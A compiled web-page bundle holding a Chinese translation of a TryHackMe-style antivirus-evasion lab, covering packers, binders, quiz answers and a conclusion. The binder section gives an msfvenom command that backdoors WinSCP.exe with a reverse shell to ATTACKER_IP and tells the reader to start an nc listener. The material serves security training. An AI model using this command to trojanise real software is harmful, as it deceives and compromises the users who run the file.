\u6253\u5305\u5668\u662f\u5426\u901a\u5e38\u5728\u8fd0\u884c\u524d\u5728\u5185\u5b58\u4e2d\u89e3\u5305\u539f\u59cb\u4ee3\u7801\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u67d0\u4e9b\u6253\u5305\u5668\u662f\u5426\u88ab\u67d0\u4e9b\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u68c0\u6d4b\u4e3a\u6076\u610f\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsxs)("summary",{children:[" \u6309\u7167\u8bf4\u660e\u521b\u5efa\u6253\u5305\u7684\u6709\u6548\u8f7d\u8377\u5e76\u5c06\u5176\u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\u5668\uff0c\u5730\u5740\u4e3a ",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"})," "]}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-10-\u7ed1\u5b9a\u5668",children:"\u4efb\u52a1 10 \u7ed1\u5b9a\u5668"}),"\n",(0,d.jsxs)(n.p,{children:["\u867d\u7136\u4e0d\u662f\u9632\u75c5\u6bd2\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u4f46\u5728\u8bbe\u8ba1\u8981\u5206\u53d1\u7ed9\u6700\u7ec8\u7528\u6237\u7684\u6076\u610f\u6709\u6548\u8f7d\u8377\u65f6\uff0c\u7ed1\u5b9a\u5668\u4e5f\u5f88\u91cd\u8981\u3002 ",(0,d.jsx)(n.strong,{children:"\u7ed1\u5b9a\u5668"})," \u662f\u4e00\u79cd\u5c06\u4e24\u4e2a\uff08\u6216\u66f4\u591a\uff09\u53ef\u6267\u884c\u6587\u4ef6\u5408\u5e76\u4e3a\u4e00\u4e2a\u7684\u7a0b\u5e8f\u3002 \u5f53\u60a8\u5e0c\u671b\u5c06\u6709\u6548\u8f7d\u8377\u9690\u85cf\u5728\u53e6\u4e00\u4e2a\u5df2\u77e5\u7a0b\u5e8f\u4e2d\u5206\u53d1\u4ee5\u6b3a\u9a97\u7528\u6237\u76f8\u4fe1\u4ed6\u4eec\u6b63\u5728\u6267\u884c\u4e0d\u540c\u7684\u7a0b\u5e8f\u65f6\uff0c\u901a\u5e38\u4f1a\u4f7f\u7528\u5b83\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"\u7ed1\u5b9a\u5668",src:s(3572).A+"",width:"1386",height:"802"})}),"\n",(0,d.jsx)(n.p,{children:"\u867d\u7136\u6bcf\u4e2a\u7ed1\u5b9a\u5668\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ef\u80fd\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u5b83\u4eec\u57fa\u672c\u4e0a\u4f1a\u5c06\u60a8\u7684 shellcode \u4ee3\u7801\u6dfb\u52a0\u5230\u5408\u6cd5\u7a0b\u5e8f\u4e2d\uff0c\u5e76\u4ee5\u67d0\u79cd\u65b9\u5f0f\u6267\u884c\u5b83\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u66f4\u6539 PE \u5934\u4e2d\u7684\u5165\u53e3\u70b9\uff0c\u4f7f\u60a8\u7684 shellcode \u5728\u7a0b\u5e8f\u4e4b\u524d\u6267\u884c\uff0c\u7136\u540e\u5728\u5b8c\u6210\u540e\u5c06\u6267\u884c\u91cd\u5b9a\u5411\u56de\u5408\u6cd5\u7a0b\u5e8f\u3002 \u8fd9\u6837\uff0c\u5f53\u7528\u6237\u70b9\u51fb\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u60a8\u7684 shellcode \u5c06\u9996\u5148\u9759\u9ed8\u6267\u884c\uff0c\u7136\u540e\u7ee7\u7eed\u6b63\u5e38\u8fd0\u884c\u7a0b\u5e8f\uff0c\u800c\u7528\u6237\u4e0d\u4f1a\u6ce8\u610f\u5230\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7ed1\u5b9a",children:"\u4f7f\u7528 msfvenom \u8fdb\u884c\u7ed1\u5b9a"}),"\n",(0,d.jsxs)(n.p,{children:["\u60a8\u53ef\u4ee5\u4f7f\u7528 ",(0,d.jsx)(n.code,{children:"msfvenom"})," \u8f7b\u677e\u5c06\u60a8\u504f\u597d\u7684\u6709\u6548\u8f7d\u8377\u690d\u5165\u4efb\u4f55 .exe \u6587\u4ef6\u4e2d\u3002 \u8be5\u4e8c\u8fdb\u5236\u6587\u4ef6\u4ecd\u5c06\u6b63\u5e38\u5de5\u4f5c\uff0c\u4f46\u4f1a\u9759\u9ed8\u6267\u884c\u989d\u5916\u7684\u6709\u6548\u8f7d\u8377\u3002 msfvenom \u4f7f\u7528\u7684\u65b9\u6cd5\u901a\u8fc7\u4e3a\u60a8\u7684\u6076\u610f\u7a0b\u5e8f\u521b\u5efa\u4e00\u4e2a\u989d\u5916\u7684\u7ebf\u7a0b\u6765\u6ce8\u5165\u5b83\uff0c\u56e0\u6b64\u4e0e\u4e4b\u524d\u63d0\u5230\u7684\u7565\u6709\u4e0d\u540c\uff0c\u4f46\u8fbe\u5230\u4e86\u76f8\u540c\u7684\u7ed3\u679c\u3002 \u62e5\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u7ebf\u7a0b\u751a\u81f3\u66f4\u597d\uff0c\u56e0\u4e3a\u5982\u679c\u60a8\u7684 shellcode \u56e0\u67d0\u79cd\u539f\u56e0\u5931\u8d25\uff0c\u60a8\u7684\u7a0b\u5e8f\u4e0d\u4f1a\u88ab\u963b\u585e\u3002"]}),"\n",(0,d.jsxs)(n.p,{children:["\u5bf9\u4e8e\u6b64\u4efb\u52a1\uff0c\u6211\u4eec\u5c06\u5bf9\u4f4d\u4e8e ",(0,d.jsx)(n.code,{children:"C:\\Tools\\WinSCP"})," \u7684 WinSCP \u53ef\u6267\u884c\u6587\u4ef6\u8fdb\u884c\u540e\u95e8\u5904\u7406\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u8981\u521b\u5efa\u540e\u95e8\u7684 WinSCP.exe\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 Windows \u673a\u5668\u4e0a\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\uff1a"}),"\n",(0,d.jsxs)(n.p,{children:[(0,d.jsx)(n.strong,{children:"\u6ce8\u610f"}),"\uff1a\u4e3a\u65b9\u4fbf\u8d77\u89c1\uff0cWindows \u673a\u5668\u4e0a\u5b89\u88c5\u4e86 Metasploit\uff0c\u4f46\u751f\u6210\u6709\u6548\u8f7d\u8377\u53ef\u80fd\u9700\u8981\u6700\u591a\u4e09\u5206\u949f\uff08\u4ea7\u751f\u7684\u8b66\u544a\u53ef\u4ee5\u5b89\u5168\u5ffd\u7565\uff09\u3002"]}),"\n",(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-shell",metastring:'title="AttackBox"',children:"C:\\> msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe\n"})}),"\n",(0,d.jsxs)(n.p,{children:["\u751f\u6210\u7684 WinSCP-evil.exe \u5c06\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u6267\u884c reverse_tcp meterpreter \u6709\u6548\u8f7d\u8377\u3002 \u5728\u6267\u884c\u4efb\u4f55\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u8bb0\u4f4f\u8bbe\u7f6e\u4e00\u4e2a ",(0,d.jsx)(n.code,{children:"nc"})," \u76d1\u542c\u5668\u4ee5\u63a5\u6536\u53cd\u5411 shell\u3002 \u5f53\u60a8\u6267\u884c\u540e\u95e8\u7684\u53ef\u6267\u884c\u6587\u4ef6\u65f6\uff0c\u5b83\u5e94\u8be5\u5411\u60a8\u53d1\u9001\u4e00\u4e2a\u53cd\u5411 shell\uff0c\u540c\u65f6\u7ee7\u7eed\u4e3a\u7528\u6237\u6267\u884c WinSCP.exe\uff1a"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"img",src:s(7624).A+"",width:"1845",height:"573"})}),"\n",(0,d.jsx)(n.h3,{id:"\u7ed1\u5b9a\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",children:"\u7ed1\u5b9a\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6"}),"\n",(0,d.jsx)(n.p,{children:"\u7ed1\u5b9a\u5668\u5728\u9690\u85cf\u60a8\u7684\u6709\u6548\u8f7d\u8377\u514d\u53d7\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\u68c0\u6d4b\u65b9\u9762\u4f5c\u7528\u4e0d\u5927\u3002 \u7b80\u5355\u5730\u5c06\u4e24\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5408\u5e76\u800c\u4e0d\u505a\u4efb\u4f55\u66f4\u6539\u610f\u5473\u7740\u751f\u6210\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4ecd\u4f1a\u89e6\u53d1\u539f\u59cb\u6709\u6548\u8f7d\u8377\u7684\u4efb\u4f55\u7b7e\u540d\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u7ed1\u5b9a\u5668\u7684\u4e3b\u8981\u7528\u9014\u662f\u6b3a\u9a97\u7528\u6237\u76f8\u4fe1\u4ed6\u4eec\u6b63\u5728\u6267\u884c\u5408\u6cd5\u7684\u53ef\u6267\u884c\u6587\u4ef6\u800c\u4e0d\u662f\u6076\u610f\u6709\u6548\u8f7d\u8377\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u5728\u521b\u5efa\u771f\u5b9e\u6709\u6548\u8f7d\u8377\u65f6\uff0c\u60a8\u53ef\u80fd\u5e0c\u671b\u4f7f\u7528\u7f16\u7801\u5668\u3001\u52a0\u5bc6\u5668\u6216\u6253\u5305\u5668\u6765\u9690\u85cf\u60a8\u7684 shellcode \u514d\u53d7\u57fa\u4e8e\u7b7e\u540d\u7684\u9632\u75c5\u6bd2\u8f6f\u4ef6\u68c0\u6d4b\uff0c\u7136\u540e\u5c06\u5176\u7ed1\u5b9a\u5230\u5df2\u77e5\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff0c\u4ee5\u4fbf\u7528\u6237\u4e0d\u77e5\u9053\u6b63\u5728\u6267\u884c\u4ec0\u4e48\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u8bf7\u968f\u610f\u5c1d\u8bd5\u5c06\u60a8\u7684\u7ed1\u5b9a\u53ef\u6267\u884c\u6587\u4ef6\u4e0a\u4f20\u5230 THM \u9632\u75c5\u6bd2\u68c0\u67e5\u7f51\u7ad9\uff08\u684c\u9762\u4e0a\u6709\u94fe\u63a5\uff09\u800c\u4e0d\u8fdb\u884c\u4efb\u4f55\u6253\u5305\uff0c\u60a8\u5e94\u8be5\u4f1a\u4ece\u670d\u52a1\u5668\u6536\u5230\u68c0\u6d4b\u7ed3\u679c\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u6cd5\u672c\u8eab\u5728\u5c1d\u8bd5\u4ece\u670d\u52a1\u5668\u83b7\u53d6\u6807\u5fd7\u65f6\u4e0d\u4f1a\u6709\u592a\u5927\u5e2e\u52a9\u3002"}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u7ed1\u5b9a\u5668\u662f\u5426\u6709\u52a9\u4e8e\u7ed5\u8fc7\u9632\u75c5\u6bd2\u89e3\u51b3\u65b9\u6848\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"nay\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u7ed1\u5b9a\u5668\u662f\u5426\u53ef\u7528\u4e8e\u4f7f\u6709\u6548\u8f7d\u8377\u770b\u8d77\u6765\u50cf\u5408\u6cd5\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff1f (\u662f/\u5426) "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"yea\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-11-\u7ed3\u8bba",children:"\u4efb\u52a1 11 \u7ed3\u8bba"}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u672c\u623f\u95f4\u4e2d\uff0c\u6211\u4eec\u63a2\u8ba8\u4e86\u653b\u51fb\u8005\u53ef\u7528\u4e8e\u89c4\u907f\u4ec5\u4f9d\u8d56\u57fa\u4e8e\u78c1\u76d8\u68c0\u6d4b\u7684\u9632\u75c5\u6bd2\u5f15\u64ce\u7684\u4e00\u4e9b\u7b56\u7565\u3002 \u867d\u7136\u8fd9\u53ea\u662f\u4efb\u4f55\u73b0\u4ee3\u9632\u75c5\u6bd2\u5f15\u64ce\u53ef\u7528\u673a\u5236\u4e4b\u4e00\uff0c\u4f46\u6211\u4eec\u81f3\u5c11\u5e94\u8be5\u80fd\u591f\u5c06\u6211\u4eec\u7684\u6709\u6548\u8f7d\u8377\u4f5c\u4e3a\u7b2c\u4e00\u6b65\u4f20\u9012\u5230\u53d7\u5bb3\u8005\u7684\u78c1\u76d8\u4e0a\u3002 \u7ed5\u8fc7\u5185\u5b58\u68c0\u6d4b\u548c\u5176\u4ed6\u9ad8\u7ea7\u68c0\u6d4b\u673a\u5236\u7559\u5f85\u672a\u6765\u7684\u623f\u95f4\u8ba8\u8bba\u3002 \u60a8\u53ef\u80fd\u60f3\u67e5\u770b ",(0,d.jsx)(n.a,{href:"https://tryhackme.com/room/runtimedetectionevasion",children:"\u8fd0\u884c\u65f6\u68c0\u6d4b\u89c4\u907f"})," \u4ee5\u83b7\u53d6\u6709\u5173\u7ed5\u8fc7\u53ef\u80fd\u963b\u6b62\u60a8\u7684\u6709\u6548\u8f7d\u8377\u89e6\u53d1\u7684\u8fdb\u4e00\u6b65 Windows \u5b89\u5168\u673a\u5236\u7684\u66f4\u591a\u4fe1\u606f\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u8bf7\u8bb0\u4f4f\uff0c\u4efb\u4f55\u52a0\u5bc6\u5668\u3001\u7f16\u7801\u5668\u6216\u6253\u5305\u5668\u7684\u6210\u529f\u5f88\u5927\u7a0b\u5ea6\u4e0a\u53d6\u51b3\u4e8e\u9632\u75c5\u6bd2\u5f15\u64ce\u4e0d\u77e5\u9053\u5b83\u4eec\u7684\u4efb\u4f55\u7279\u5f81\u3002 \u56e0\u6b64\uff0c\u5728\u5c1d\u8bd5\u7ed5\u8fc7\u4efb\u4f55\u5b9e\u9645\u89e3\u51b3\u65b9\u6848\u65f6\uff0c\u80fd\u591f\u81ea\u5b9a\u4e49\u81ea\u5df1\u7684\u6709\u6548\u8f7d\u8377\u81f3\u5173\u91cd\u8981\u3002"}),"\n",(0,d.jsx)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u70b9\u51fb\u5e76\u7ee7\u7eed\u5b66\u4e60\uff01 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})})]})}function h(e={}){const{wrapper:n}={...(0,x.R)(),...e.components};return n?(0,d.jsx)(n,{...e,children:(0,d.jsx)(a,{...e})}):a(e)}},2299:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251145-214539-9b952f0ac4f79fd84f8fb336a6f2f1d7.png"},2478:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251110-191013-219b65a0e191f8c72e1191c5c1f46504.png"},3267:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251149-214931-254dc3c9b34342193396d3c17848997c.png"},3572:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251117-191753-0a247d89aedbd936d8d4388d2d2d0992.png"},4107:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251112-191201-2e401c6320c03304a82e438009796c8d.png"},5358:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251107-190744-362c25ed4c631a26cdc548cd5e245ef7.png"},6542:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251141-214152-b953a19b6109ea2253047988d2567d1d.png"},6671:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251111-191147-0609c4588f5a54145e705e530551430e.png"},7624:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251119-191917-0ce07598d311293756197d9da2563671.png"},8453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>r});var l=s(6540);const d={},x=l.createContext(d);function i(e){const n=l.useContext(x);return l.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(d):e.components||d:i(e.components),l.createElement(x.Provider,{value:n},e.children)}},8558:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251150-205017-d3e301a62f4d6635ea60ab864325b7c5.png"},9342:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251149-204935-1395e4ae7dc4891e997fd97ed8d1f65f.png"},9394:(e,n,s)=>{s.d(n,{A:()=>l});const l="data:image/png;base64,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